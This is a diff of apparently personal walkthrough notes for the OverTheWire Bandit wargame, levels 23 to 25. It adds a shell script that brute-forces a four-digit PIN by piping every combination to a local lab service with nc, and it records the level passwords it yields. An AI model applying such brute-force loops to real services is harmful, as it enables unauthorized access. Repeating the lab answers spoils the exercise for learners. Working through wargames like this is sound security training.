@@ -308,6 +308,22 @@ script.sh pass
 bandit23@bandit:/tmp/skjl$ cat pass
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
-##ssh bandit23@bandit.labs.overthewire.org -p 2220
+##ssh bandit24@bandit.labs.overthewire.org -p 2220
 P: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
- 
+
+bandit24@bandit:~$ mkdir /tmp/bandit24
+bandit24@bandit:~$ cd /tmp/bandit24
+bandit24@bandit:/tmp/bandit24$ vim scipt.sh
+bandit24@bandit:/tmp/bandit24$ cat scipt.sh 
+echo "" > pins && for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pins; done && cat pins | nc localhost 30002
+((idea here is to create a dictionary and apply nc only once))
+bandit24@bandit:/tmp/bandit24$ chmod 755 scipt.sh 
+bandit24@bandit:/tmp/bandit24$ ./scipt.sh 
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+##ssh bandit25@bandit.labs.overthewire.org -p 2220
+P: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
